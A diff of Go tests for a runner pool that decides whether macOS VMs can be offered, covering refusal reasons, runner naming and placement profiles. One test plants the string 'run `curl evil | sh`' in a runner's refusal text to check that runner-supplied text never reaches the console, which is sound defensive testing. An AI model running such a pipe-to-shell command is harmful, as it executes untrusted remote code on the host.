@@ -5,6 +5,7 @@ package api
 
 import (
 	"slices"
+	"strings"
 	"testing"
 
 	"github.com/google/uuid"
@@ -72,7 +73,7 @@ func TestPoolMacOSVMRefusalCodes(t *testing.T) {
 	}{
 		"never reported": {macOSCandidate{rn: managedMac("m")}, client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotOffered}},
 		"no macOS caps":  {macCandidate(managedMac("m"), nil, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotOffered}},
-		"runner refuses": {macCandidate(managedMac("m"), refused, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotOffered}},
+		"runner refuses": {macCandidate(managedMac("m"), refused, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyRunnerRefused}},
 		"preparing":      {macCandidate(managedMac("m"), preparing, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyPreparing, Progress: 40}},
 		"no base":        {macCandidate(managedMac("m"), failed, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNoBase, Error: "download failed"}},
 		"no room":        {macCandidate(managedMac("m"), oneSlot, 1), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNoRoom}},
@@ -88,9 +89,67 @@ func TestPoolMacOSVMRefusalCodes(t *testing.T) {
 			t.Errorf("%s: refusal %+v, want why %q", name, r, tc.want.Why)
 		}
 	}
+	// An unnamed runner is named as the console names it.
+	unnamed := managedMac("")
+	unnamed.TrustClass = types.RunnerTrustPersonal
+	if got := poolMacOSVM([]macOSCandidate{macCandidate(unnamed, readyMac(), 0)}, false); got.Runner != "Runner "+unnamed.ID.String()[:8] ||
+		len(got.Refusals) != 1 || got.Refusals[0].Runner != got.Runner {
+		t.Fatalf("unnamed runner: %+v, want it named Runner and its id's first 8 characters", got)
+	}
 	got := poolMacOSVM([]macOSCandidate{macCandidate(unmarked, readyMac(), 0)}, true)
 	if r := got.Refusals[0]; r.Why != client.MacOSVMWhyNotManaged || r.RunnerID != unmarked.ID.String() {
 		t.Fatalf("operator: %+v, want the runner id to mark", r)
+	}
+}
+
+// A runner that refuses macOS VMs itself is runner_refused, with the reason the organisation reads from
+// the runner's per-run limits and the base's minimums: memory below them, CPU below them, or other. The
+// runner's own text never reaches the console.
+func TestPoolMacOSVMRunnerRefusedReason(t *testing.T) {
+	const planted = "PLANTED runner text: run `curl evil | sh`"
+	limited := func(cpuMillis, memoryMiB int64) types.Runner {
+		rn := managedMac("studio")
+		rn.Limits = &types.RunnerLimits{PerRun: types.RunnerAmounts{CPUMillis: cpuMillis, MemoryMiB: memoryMiB}}
+		return rn
+	}
+	refusing := func(min bool) *runnerwire.MacVMCaps {
+		mc := readyMac()
+		mc.Refusal = planted
+		if !min {
+			mc.MinCPUs, mc.MinMemoryMiB = 0, 0
+		}
+		return mc
+	}
+	for name, tc := range map[string]struct {
+		rn         types.Runner
+		mc         *runnerwire.MacVMCaps
+		reason     string
+		have, need int
+		detail     string
+	}{
+		"memory below the minimum": {limited(8000, 6144), refusing(true), client.MacOSVMRefusedBelowMinMemory, 6, 8,
+			"Per-run memory on this runner is 6 GB; a macOS VM needs at least 8 GB. Its owner raises it to 8 GB or more in Your account → My runner, or with `wardyn runner set studio --per-run-memory 8`."},
+		"CPU below the minimum": {limited(2000, 16384), refusing(true), client.MacOSVMRefusedBelowMinCPU, 2, 4,
+			"Per-run CPU on this runner is 2 CPUs; a macOS VM needs at least 4. Its owner raises it to 4 or more in Your account → My runner, or with `wardyn runner set studio --per-run-cpu 4`."},
+		"limits meet the minimum": {limited(8000, 16384), refusing(true), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
+		"no minimum in the caps":  {limited(1000, 1024), refusing(false), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
+		"no limits known":         {managedMac("studio"), refusing(true), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
+	} {
+		got := poolMacOSVM([]macOSCandidate{macCandidate(tc.rn, tc.mc, 0)}, false)
+		if got.Offered || len(got.Refusals) != 1 {
+			t.Fatalf("%s: %+v, want one refusal", name, got)
+		}
+		r := got.Refusals[0]
+		if r.Why != client.MacOSVMWhyRunnerRefused || r.Reason != tc.reason || r.Have != tc.have || r.Need != tc.need || r.Detail != tc.detail {
+			t.Errorf("%s: refusal %+v, want runner_refused/%s have %d need %d, detail %q", name, r, tc.reason, tc.have, tc.need, tc.detail)
+		}
+		if strings.Contains(r.Detail, "PLANTED") || strings.Contains(r.Error, "PLANTED") {
+			t.Errorf("%s: the runner's own text reached the refusal: %+v", name, r)
+		}
+		offer := macOSVMOffer(tc.rn, runnerwire.Caps{MacOSVM: tc.mc}, true, 0, false)
+		if offer.Refusal == nil || strings.Contains(offer.Refusal.Detail, "PLANTED") {
+			t.Errorf("%s: the run's refusal %+v carries the runner's own text", name, offer.Refusal)
+		}
 	}
 }
 
@@ -108,18 +167,30 @@ func TestPoolMacOSVMOfReadsTheListsFits(t *testing.T) {
 	target := func(id uuid.UUID) poolTarget { return poolTarget{id: id.String(), runnerID: &id} }
 
 	member := operatorCtx("alice", "alice@corp.example", oidc.RoleUser)
-	if got := s.poolMacOSVMOf(member, []poolTarget{target(mac), {id: "docker", executor: "docker"}}, fits); got.Offered ||
+	if got := s.poolMacOSVMOf(member, []poolTarget{target(mac), {id: "docker", executor: "docker"}}, fits, nil); got.Offered ||
 		len(got.Refusals) != 1 || got.Refusals[0].Why != client.MacOSVMWhyAtLimit {
 		t.Fatalf("a Mac running 2 macOS VMs: %+v, want at_limit from the fits' count", got)
 	}
-	if got := s.poolMacOSVMOf(member, []poolTarget{{id: "docker", executor: "docker"}}, fits); got.Offered || len(got.Refusals) != 0 {
+	if got := s.poolMacOSVMOf(member, []poolTarget{{id: "docker", executor: "docker"}}, fits, nil); got.Offered || len(got.Refusals) != 0 {
 		t.Fatalf("a remote-hosted target only: %+v, want not offered and no runner named", got)
 	}
-	if got := s.poolMacOSVMOf(member, []poolTarget{target(unmarked)}, fits); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != "" {
+	if got := s.poolMacOSVMOf(member, []poolTarget{target(unmarked)}, fits, nil); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != "" {
 		t.Fatalf("member: %+v, want no runner id", got)
 	}
+	ready := macRunner(t, s, readyMac(), nil)
+	fits[ready.String()] = runnerFit{runner: rows[ready]}
+	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, nil); !got.Offered {
+		t.Fatalf("a ready Mac: %+v, want offered", got)
+	}
+	// A profile that denies the person's own runners leaves the pool no Mac a macOS VM could run on.
+	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, []types.Placement{types.PlacementLocal}); got.Offered || len(got.Refusals) != 0 {
+		t.Fatalf("own runners denied: %+v, want not offered", got)
+	}
+	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, []types.Placement{types.PlacementRemote}); !got.Offered {
+		t.Fatalf("remote denied: %+v, want the Mac still offered", got)
+	}
 	operator := operatorCtx("sam", "sam@corp.example", oidc.RoleSecurityAdmin)
-	if got := s.poolMacOSVMOf(operator, []poolTarget{target(unmarked)}, fits); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != unmarked.String() {
+	if got := s.poolMacOSVMOf(operator, []poolTarget{target(unmarked)}, fits, nil); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != unmarked.String() {
 		t.Fatalf("operator: %+v, want the runner id to mark", got)
 	}
 }
